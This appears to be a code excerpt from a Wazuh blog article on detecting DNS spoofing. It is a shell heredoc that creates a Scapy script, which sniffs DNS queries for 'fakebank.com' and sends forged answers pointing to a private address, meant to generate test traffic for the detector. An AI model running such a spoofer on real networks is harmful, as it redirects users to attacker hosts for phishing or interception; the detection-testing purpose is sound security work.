<!-- Source: https://wazuh.com/blog/detecting-dns-spoofing-attacks-with-wazuh/ | Article: Detecting DNS spoofing attacks with Wazuh -->
cat << 'EOF' > /tmp/dns_spoof_test.py
from scapy.all import *
import time

print("DNS Spoofing Test Script Started - Listening on enp0s3...")

def spoof_dns(pkt):
    if DNSQR in pkt and "fakebank.com" in pkt[DNSQR].qname.decode().lower():
        spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                  UDP(dport=pkt[UDP].sport, sport=53) / \
                  DNS(id=pkt[DNS].id, qr=1, aa=1, ra=1, 
                      qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname, rdata="172.20.10.99", ttl=10))
        
        send(spoofed, verbose=0, iface="<YOUR_INTERFACE>")
        print(f"[+] Spoofed: {pkt[DNSQR].qname.decode()} → 172.20.10.99 (TTL=10)")

print("Waiting for DNS queries to fakebank.com...")
sniff(iface="<YOUR_INTERFACE>", filter="udp port 53", prn=spoof_dns, store=0)
EOF